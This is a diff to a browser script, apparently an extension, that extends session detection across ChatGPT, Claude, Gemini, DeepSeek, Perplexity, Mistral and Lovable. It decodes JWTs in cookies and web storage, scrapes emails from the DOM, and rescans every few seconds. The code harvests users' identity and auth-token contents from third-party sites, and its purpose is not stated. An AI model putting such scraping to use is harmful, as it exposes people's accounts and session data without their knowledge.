@@ -802,8 +802,8 @@
     var ws = workspaceId ? String(workspaceId).trim() : "";
     var key = email + "::" + ws;
     var now = Date.now();
-    // Re-verify periodically (every 15 min max) or immediately if email/workspace changed
-    if (!force && key === lastCheckedKey && (now - lastCheckedAt < 900000)) return;
+    // Re-verify on page refresh, site navigation, and every 15s
+    if (!force && key === lastCheckedKey && (now - lastCheckedAt < 15000)) return;
     lastCheckedKey = key;
     lastCheckedAt = now;
     detectedEmail = email;
@@ -823,10 +823,39 @@
     }, "*");
   }
 
-  // Universal deep object search for email and workspace keys across all auth formats
-  function scanObjectForSession(obj, depth) {
-    if (!obj || typeof obj !== "object" || (depth || 0) > 5) return;
+  // Universal JWT Payload Decoder
+  function decodeJwtPayload(jwtStr) {
+    if (!jwtStr || typeof jwtStr !== "string") return null;
+    var parts = jwtStr.trim().split(".");
+    if (parts.length < 2) return null;
     try {
+      var base64 = parts[1].replace(/-/g, "+").replace(/_/g, "/");
+      while (base64.length % 4) base64 += "=";
+      var jsonStr = decodeURIComponent(escape(atob(base64)));
+      return JSON.parse(jsonStr);
+    } catch (_) {
+      try {
+        return JSON.parse(atob(base64));
+      } catch (__) {
+        return null;
+      }
+    }
+  }
+
+  // Universal deep object search for email and workspace keys across all 7 AI platforms
+  function scanObjectForSession(obj, depth) {
+    if (!obj || (depth || 0) > 6) return;
+    try {
+      // 1. Array scanning (e.g. Claude organizations list, member arrays)
+      if (Array.isArray(obj)) {
+        for (var a = 0; a < obj.length; a++) {
+          scanObjectForSession(obj[a], (depth || 0) + 1);
+        }
+        return;
+      }
+      if (typeof obj !== "object") return;
+
+      // 2. Direct email candidates
       var candidate = obj.email || obj.email_address || obj.user_email || obj.upn || obj.mail ||
         obj.userPrincipalName || obj.preferred_username || obj.accountEmail || obj.account_email ||
         obj.primaryEmail || obj.primary_email;
@@ -847,6 +876,26 @@
         triggerSessionAuth(obj.login, obj.workspace_id || obj.org_id || "");
         return;
       }
+
+      // 3. Nested user / profile / session containers (ChatGPT, Lovable, DeepSeek, Mistral, Perplexity)
+      var subContainers = [obj.user, obj.data, obj.profile, obj.session, obj.account, obj.auth, obj.members, obj.user_metadata];
+      for (var sc = 0; sc < subContainers.length; sc++) {
+        var subObj = subContainers[sc];
+        if (subObj && typeof subObj === "object") {
+          scanObjectForSession(subObj, (depth || 0) + 1);
+        }
+      }
+
+      // 4. Token payload inspection (JWT in access_token, id_token, token)
+      var tokenCandidates = [obj.access_token, obj.id_token, obj.token, obj.jwt, obj.userToken];
+      for (var tc = 0; tc < tokenCandidates.length; tc++) {
+        var tok = tokenCandidates[tc];
+        if (typeof tok === "string" && tok.startsWith("ey") && tok.includes(".")) {
+          var jwtPayload = decodeJwtPayload(tok);
+          if (jwtPayload) scanObjectForSession(jwtPayload, (depth || 0) + 1);
+        }
+      }
+
       for (var k in obj) {
         if (Object.prototype.hasOwnProperty.call(obj, k) && typeof obj[k] === "object" && obj[k] !== null) {
           scanObjectForSession(obj[k], (depth || 0) + 1);
@@ -855,7 +904,14 @@
     } catch (e) {}
   }
 
-  // Scan LocalStorage and SessionStorage for JWT or user profiles
+  // Scan LocalStorage, SessionStorage, and Cookies for user profiles across all 7 AI providers:
+  // 1. ChatGPT (Auth0, NextAuth, persist:auth)
+  // 2. Claude (lastActiveOrg, anthropic-user)
+  // 3. Gemini (Google Account, WIZ_global_data)
+  // 4. DeepSeek (userToken, ds_user, user_info)
+  // 5. Perplexity (pplx:user, next-auth)
+  // 6. Mistral AI (mistral:session, auth-user, kc-token)
+  // 7. Lovable AI (sb-*-auth-token, Supabase auth)
   function scanStorageForSession() {
     try {
       var emailRegex = /\b[A-Za-z0-9._%+-]+@([A-Za-z0-9.-]+\.[A-Za-z]{2,})\b/;
@@ -868,20 +924,27 @@
           if (!k) continue;
           var val = st.getItem(k);
           if (!val || typeof val !== "string") continue;
-          if (val.startsWith("{") && val.endsWith("}")) {
+
+          // JSON object string parsing
+          if ((val.startsWith("{") && val.endsWith("}")) || (val.startsWith("[") && val.endsWith("]"))) {
             try {
               scanObjectForSession(JSON.parse(val), 0);
             } catch (je) {}
           }
+          // Direct JWT token parsing
           if (val.startsWith("ey") && val.includes(".")) {
-            try {
-              var parts = val.split(".");
-              if (parts.length >= 2) {
-                var payload = JSON.parse(atob(parts[1].replace(/-/g, "+").replace(/_/g, "/")));
-                scanObjectForSession(payload, 0);
-              }
-            } catch (jte) {}
+            var pl = decodeJwtPayload(val);
+            if (pl) scanObjectForSession(pl, 0);
           }
+          // Embedded JWT pattern extraction
+          if (val.includes("eyJ") && val.length < 20000) {
+            var jwtMatch = val.match(/\beyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\b/);
+            if (jwtMatch && jwtMatch[0]) {
+              var plEmb = decodeJwtPayload(jwtMatch[0]);
+              if (plEmb) scanObjectForSession(plEmb, 0);
+            }
+          }
+          // Direct email pattern in storage value
           if (val.includes("@") && val.length < 8000) {
             var emMatch = val.match(emailRegex);
             if (emMatch && emMatch[0]) {
@@ -893,14 +956,40 @@
           }
         }
       }
+
+      // Also scan cookies for JWT tokens or email parameters
+      if (typeof document !== "undefined" && document.cookie) {
+        var cookieStr = document.cookie;
+        if (cookieStr.includes("eyJ")) {
+          var cJwt = cookieStr.match(/\beyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\b/g);
+          if (cJwt) {
+            for (var cj = 0; cj < cJwt.length; cj++) {
+              var cPl = decodeJwtPayload(cJwt[cj]);
+              if (cPl) scanObjectForSession(cPl, 0);
+            }
+          }
+        }
+        var cEmMatch = cookieStr.match(emailRegex);
+        if (cEmMatch && cEmMatch[0]) {
+          var cEm = cEmMatch[0].toLowerCase();
+          if (!cEm.includes("sentry") && !cEm.includes("example.com") && !cEm.includes("w3.org") && !cEm.includes("schema.org")) {
+            triggerSessionAuth(cEm, "");
+          }
+        }
+      }
     } catch (e) {}
   }
 
-  // Scan DOM for visible user email (profile avatars, Google Account chips, user menus)
+  // Scan DOM for visible user email across ChatGPT, Claude, Gemini, DeepSeek, Perplexity, Mistral, Lovable
   function scanDOMForSession() {
     try {
       var emailRegex = /\b[A-Za-z0-9._%+-]+@([A-Za-z0-9.-]+\.[A-Za-z]{2,})\b/;
-      var elements = querySelectorAllDeep("[aria-label*='@'], [title*='@'], [alt*='@'], [data-identifier*='@'], [data-email*='@'], [data-user*='@'], [data-testid*='profile'], [data-testid*='user'], [data-testid*='account'], a[href*='accounts.google.com'], img[alt*='Google Account']");
+      var elements = querySelectorAllDeep(
+        "[aria-label*='@'], [title*='@'], [alt*='@'], [data-identifier*='@'], [data-email*='@'], [data-user*='@'], " +
+        "[data-testid*='profile'], [data-testid*='user'], [data-testid*='account'], " +
+        "a[href*='accounts.google.com'], img[alt*='Google Account'], [aria-label*='Google Account'], " +
+        "div[class*='user-avatar' i], div[class*='avatar' i], button[data-testid*='user' i], button[aria-label*='profile' i]"
+      );
       for (var i = 0; i < elements.length; i++) {
         var el = elements[i];
         if (!el) continue;
@@ -3140,8 +3229,8 @@
     };
   }
 
-  // Periodic, load, and focus session inspection
-  [400, 1200, 2500].forEach(function (ms) {
+  // Immediate, load, refresh, and focus session inspection across all 7 AI providers
+  [50, 250, 600, 1200, 2500, 4500].forEach(function (ms) {
     setTimeout(function () {
       if (armed) {
         scanStorageForSession();
@@ -3154,13 +3243,31 @@
       scanStorageForSession();
       scanDOMForSession();
     }
+  }, true);
+  document.addEventListener("visibilitychange", function () {
+    if (document.visibilityState === "visible" && armed) {
+      scanStorageForSession();
+      scanDOMForSession();
+    }
+  }, true);
+  window.addEventListener("DOMContentLoaded", function () {
+    if (armed) {
+      scanStorageForSession();
+      scanDOMForSession();
+    }
+  });
+  window.addEventListener("load", function () {
+    if (armed) {
+      scanStorageForSession();
+      scanDOMForSession();
+    }
   });
   setInterval(function () {
     if (armed) {
       scanStorageForSession();
       scanDOMForSession();
     }
-  }, 5000);
+  }, 3000);
 
   if (typeof window !== "undefined") {
     window.__yp_test = {
